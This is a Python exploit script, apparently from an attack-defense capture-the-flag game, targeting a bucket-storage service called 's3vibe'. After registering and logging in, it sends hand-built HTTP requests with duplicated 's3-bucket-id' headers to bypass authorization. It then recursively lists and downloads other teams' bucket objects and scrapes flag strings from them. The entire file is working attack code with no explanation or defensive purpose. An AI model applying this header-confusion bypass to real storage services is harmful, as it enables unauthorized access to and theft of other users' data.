#!/usr/bin/env python3

import requests
import base64
import checklib
import re
import json
import sys
import socket


forcad_ip = '10.10.10.10'
TASK_NAME = "s3vibe"
port = 2323


regex = re.compile('[A-Z0-9]{31}=')

ALPH = [chr(i) for i in range(65, 65 + 26)] + [chr(i) for i in range(97, 97 + 26)]
username = checklib.rnd_string(10, ALPH)
password = checklib.rnd_string(10, ALPH)
email = checklib.rnd_string(10, ALPH) + "@gmail.com"


def get_attack_data(localtest, team_ip):
    if localtest:
        attack_data = json.loads(f'{{"{TASK_NAME}": {{"127.0.0.1": ["bucket-5a5aa441f6c544fb"]}}}}')
    else:
        attack_data = requests.get(f"http://{forcad_ip}/api/client/attack_data").json()

    if TASK_NAME not in attack_data:
        print(f"Task '{TASK_NAME}' not found in attack data.", flush=True)
        return

    if team_ip not in attack_data[TASK_NAME]:
        print(f"IP '{team_ip}' not found in attack data.", flush=True)
        return

    return attack_data[TASK_NAME][team_ip]


def register(BASE_URL):
    url = f"{BASE_URL}/api/register"
    data={"email": email, "password": password, "username": username}
    headers = {"Content-Type": "application/json"}

    requests.post(url, json=data, headers=headers)


def login(BASE_URL):
    session = requests.session()
    url = f"{BASE_URL}/api/login"
    data = {"username": username, "password": password}
    headers = {"Content-Type": "application/json"}
    
    resp = session.post(url, json=data, headers=headers, allow_redirects=False)
    if resp.status_code == 200:
        auth_token = resp.json()["token"]
        return auth_token
    else:
        return None

def create_bucket(BASE_URL, headers):
    url = f"{BASE_URL}/api/buckets"
    data={"name": "test"}
    return requests.post(url, json=data, headers=headers)
    


def http_request(req, ip, port, timeout=0.5):             
    with socket.create_connection((ip, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(req.encode())
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        return data


def extract_json(res):
    return json.loads(res.split(b'\r\n')[-4][:-1].decode())


def listing_bucket(hint, path, ip, port, auth_token, my_bucket_id):
        req = f"GET /s3/objects?prefix={path} HTTP/1.1\r\n" \
            f"Host: {ip}:{port}\r\n" \
            f"s3-auth-token: {auth_token}\r\n" \
            f"s3-bucket-id: {hint}\r\n" \
            f"s3-bucket-id: {my_bucket_id}\r\n\r\n"
    
        res = http_request(req, ip, port)
        json_data = extract_json(res)
        if json_data["objects"] is None:
            return
        objs = [obj["Key"] for obj in json_data["objects"]]
        filepaths = [obj for obj in objs if obj[-1] != '/']
        dirs = [obj for obj in objs if obj[-1] == '/']
        for dir in dirs:
            new_filepaths = listing_bucket(hint, dir, ip, port, auth_token, my_bucket_id)
            if new_filepaths:
                filepaths += new_filepaths
        return filepaths


def sploit():
    localtest = False if len(sys.argv) > 1 else True
    ip = sys.argv[1] if not localtest else "127.0.0.1"
    BASE_URL = f"http://{ip}:{port}"

    register(BASE_URL)
    auth_token = login(BASE_URL)
    if not auth_token:
        print("[!] Login failed", flush=True)

    headers = {"s3-auth-token": auth_token}
    my_bucket_id = create_bucket(BASE_URL, headers).json()["bucket"]["bucket_id"]

    attack_data = get_attack_data(localtest, ip)
 
    for hint in attack_data:
        filepaths = listing_bucket(hint, "/", ip, port, auth_token, my_bucket_id)
        for filepath in filepaths:
            req = f"GET /s3/objects/{filepath} HTTP/1.1\r\n" \
                f"Host: {ip}:{port}\r\n" \
                f"s3-auth-token: {auth_token}\r\n" \
                f"s3-bucket-id: {hint}\r\n" \
                f"s3-bucket-id: {my_bucket_id}\r\n\r\n"

            output = http_request(req, ip, port).decode()
            print(re.findall(regex, output), flush=True)
        

if __name__ == '__main__':
    sploit()
